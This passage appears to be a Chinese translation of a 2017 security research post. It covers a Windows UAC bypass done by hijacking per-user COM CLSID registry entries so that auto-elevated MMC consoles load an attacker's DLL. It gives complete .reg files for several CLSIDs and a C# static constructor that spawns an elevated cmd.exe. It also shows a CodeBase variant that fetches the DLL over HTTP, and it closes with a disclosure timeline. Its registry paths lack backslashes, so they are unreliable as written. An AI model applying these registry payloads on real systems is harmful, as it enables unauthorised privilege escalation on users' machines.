我们可以使用如下方式在用户注册表中定义一则COM表项（保存为.reg文件）：
    Windows Registry Editor Version 5.00
    [HKEYCURRENTUSERSoftwareClassesCLSID{B29D466A-857D-35BA-8712-A758861BFEA1}] @="Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager"
    [HKEYCURRENTUSERSoftwareClassesCLSID{B29D466A-857D-35BA-8712-A758861BFEA1}Implemented Categories]
    [HKEYCURRENTUSERSoftwareClassesCLSID{B29D466A-857D-35BA-8712-A758861BFEA1}Implemented Categories{62C8FE65-4EBB-45E7-B440-6E39B2CDBF29}]
    [HKEYCURRENTUSERSoftwareClassesCLSID{B29D466A-857D-35BA-8712-A758861BFEA1}InprocServer32] @="C:WindowsSystem32mscoree.dll" "Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral" "Class"="TestDotNet.Class1" "RuntimeVersion"="v4.0.30319" "ThreadingModel"="Both" "CodeBase"="file://C://Temp//test_managed.dll"
    [HKEYCURRENTUSERSoftwareClassesCLSID{B29D466A-857D-35BA-8712-A758861BFEA1}InprocServer3210.0.0.0] "Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral" "Class"="TestDotNet.Class1" "RuntimeVersion"="v4.0.30319" "CodeBase"="file://C://Temp//test_managed.dll"
    [HKEYCURRENTUSERSoftwareClassesCLSID{B29D466A-857D-35BA-8712-A758861BFEA1}ProgId] @="Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager"
MMC随后就会加载我们构造的DLL，并会尝试访问TestDotNet.Class1类。默认情况下，C#无法像DllMain那样，创建一个简单便捷的DLL入口点（我们也不想专门为此写一个模块初始化程序，因为我们很懒），但注册表中引用的那个类似乎会被加载，因此，我们可以使用静态构造函数来执行我们的提权代码：
    using System;
    using System.Diagnostics;
    namespace TestDotNet
    {
       public class Class1
       {
          static Class1()
          { 
             Process.Start("cmd.exe");
             Environment.Exit(0);
          }
       }
    }
DLL以及相应的注册表项准备就绪后，现在运行gpedit.msc，我们就会得到一个高权限shell（这次是通过一个 .NET DLL来实现）：
这种方法比较有趣的一点在于，CodeBase参数不必局限于本地文件以及SMB共享文件，使用HTTP URL地址也可以完成加载：
    "CodeBase"="http://server:8080/test_managed.dll"
所下载的DLL需要保存到磁盘中，因此，相对比本地DLL而言，这种方法更容易被检测到（因为涉及到磁盘+网络行为）。
攻击者喜闻乐见的是，有多个CLSID可以用于这种方法。
比如，compmgmt.msc、eventvwr.msc、secpol.msc以及taskschd.msc可以使用如下方法实现UAC绕过目的：
将“ **Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory** ”组件作为托管DLL。
    Windows Registry Editor Version 5.00
    [HKEYCURRENTUSERSoftwareClassesCLSID{D5AB5662-131D-453D-88C8-9BBA87502ADE}] @="Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory"
    [HKEYCURRENTUSERSoftwareClassesCLSID{D5AB5662-131D-453D-88C8-9BBA87502ADE}Implemented Categories]
    [HKEYCURRENTUSERSoftwareClassesCLSID{D5AB5662-131D-453D-88C8-9BBA87502ADE}Implemented Categories{62C8FE65-4EBB-45e7-B440-6E39B2CDBF29}]
    [HKEYCURRENTUSERSoftwareClassesCLSID{D5AB5662-131D-453D-88C8-9BBA87502ADE}InprocServer32] @="C:WindowsSystem32mscoree.dll" "Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral" "Class"="TestDotNet.Class1" "RuntimeVersion"="v2.0.50727" "ThreadingModel"="Both" "CodeBase"="file://C://Temp//test_managed.dll"
    [HKEYCURRENTUSERSoftwareClassesCLSID{D5AB5662-131D-453D-88C8-9BBA87502ADE}InprocServer323.0.0.0] "Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral" "Class"="TestDotNet.Class1" "RuntimeVersion"="v2.0.50727" "CodeBase"="file://C://Temp//test_managed.dll"
将“NDP SymBinder”作为原生DLL，通过 **Server** 入口进行劫持。
    Windows Registry Editor Version 5.00
    [HKEYCURRENTUSERSoftwareClassesCLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}] @="NDP SymBinder"
    [HKEYCURRENTUSERSoftwareClassesCLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}InprocServer32] @="C:WindowsSystem32mscoree.dll" "ThreadingModel"="Both"
    [HKEYCURRENTUSERSoftwareClassesCLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}InprocServer324.0.30319] @="4.0.30319" "ImplementedInThisVersion"=""
    [HKEYCURRENTUSERSoftwareClassesCLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}ProgID] @="CorSymBinder_SxS"
    [HKEYCURRENTUSERSoftwareClassesCLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}Server] @="C:Temptest_unmanaged.dll"
将“ **Microsoft Common Language Runtime Meta Data** ”组件作为原生DLL，通过 **Server**
入口进行劫持（仅适用于secpol.msc）。
    Windows Registry Editor Version 5.00
    [HKEYCURRENTUSERSoftwareClassesCLSID{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}] @="Microsoft Common Language Runtime Meta Data"
    [HKEYCURRENTUSERSoftwareClassesCLSID{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}InprocServer32] @="C:WindowsSystem32mscoree.dll" "ThreadingModel"="Both"
    [HKEYCURRENTUSERSoftwareClassesCLSID{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}InprocServer324.0.30319] @="4.0.30319" "ImplementedInThisVersion"=""
    [HKEYCURRENTUSERSoftwareClassesCLSID{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}ProgID] @="CLRMetaData.CorRuntimeHost.2"
    [HKEYCURRENTUSERSoftwareClassesCLSID{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}Server] @="........Temptest_unmanaged.dll"
注意：这里所使用的路径必须是相对路径，否则mmc.exe会尝试加载
**C:WindowsMicrosoft.NETFramework64v4.0.30319C:Temptest_unmanaged.dll** 。
**六、不安全的安全屏障**
****
微软曾反复表态，称UAC并不是一个安全屏障。安全人员通常会使用更加贴切实际的语言来描述这一点：不要信任UAC，不要以split-token管理员身份运行，非管理员任务始终使用非管理员用户权限运行。我十分赞同这段话。
尽管如此，许多人仍然会以本地管理员身份来运行，这些人正是渗透测试人员（或者红队）以及攻击者的目标。因此我认为会有人对这项技术感兴趣。
就渗透测试而言，我推荐@tiraniddo使用的[通用方法](https://tyranidslair.blogspot.fr/2017/05/reading-your-way-around-uac-part-1.html)（具体实现样例可参考[此链接](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1)，另一种实现[方法](https://twitter.com/enigma0x3/status/907397236627329024)很快就会公布），此方法不需要加载DLL，目前大多数EDR（端点检测与响应）解决方案都无法捕获这种方法。
此外，如果你对绕过UAC非常感兴趣，关于这主题网上有许多参考资料，但以下几份资料为必修课：
[@enigma0x3](https://twitter.com/enigma0x3)的[研究成果](https://enigma0x3.net/)（以及他即将在DerbyCon上做的[演讲](https://www.derbycon.com/saturday-schedule/#event-111)内容）。
[@tiraniddo](http://local://base_request.html/@tiraniddo)写的使用[SilentCleanup](https://tyranidslair.blogspot.fr/2017/05/exploiting-environment-variables-in.html)计划任务以及进程令牌绕过UAC的技术：第[1](https://tyranidslair.blogspot.fr/2017/05/reading-your-way-around-uac-part-1.html)、[2](https://tyranidslair.blogspot.fr/2017/05/reading-your-way-around-uac-part-2.html)、[3](https://tyranidslair.blogspot.fr/2017/05/reading-your-way-around-uac-part-3.html)部分。
[@hFireF0X](https://twitter.com/hfiref0x)创建的[UACME项目](https://github.com/hfiref0x/UACME)，囊括了绝大部分已知的UAC绕过方法，他在[内核模式](http://www.kernelmode.info/forum/viewtopic.php?f=11&t=3643)方面也做了相关研究。
[@FuzzySec](https://twitter.com/fuzzysec)的[UAC工作组](https://github.com/FuzzySecurity/DefCon25)以及[Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)项目，使用PowerShell实现了多种绕过技术。
非常感谢Casey Smith（[@subtee](https://twitter.com/subTee)）关于 .NET profiler
DLL的提示，感谢微软开发者在问题根源方面给的提示，感谢Matt
Graeber（[@mattifestation](https://twitter.com/mattifestation/)）审阅本文并提出建议。
**七、时间线**
****
2017-05-19 发现UAC绕过问题。
2017-05-20 发邮件给MSRC。
2017-05-22 MSRC创建#38811案例。
2017-05-20/23 与MS开发团队就细节问题进行讨论。
2017-06-24 MSRC回复称：“经过我们的调查，我们认为这种案例不属于安全问题。UAC并非安全屏障。”
2017-07-05 Stefan Kanthak详细公布了这种UAC绕过方法。
2017-09-15 本文发表。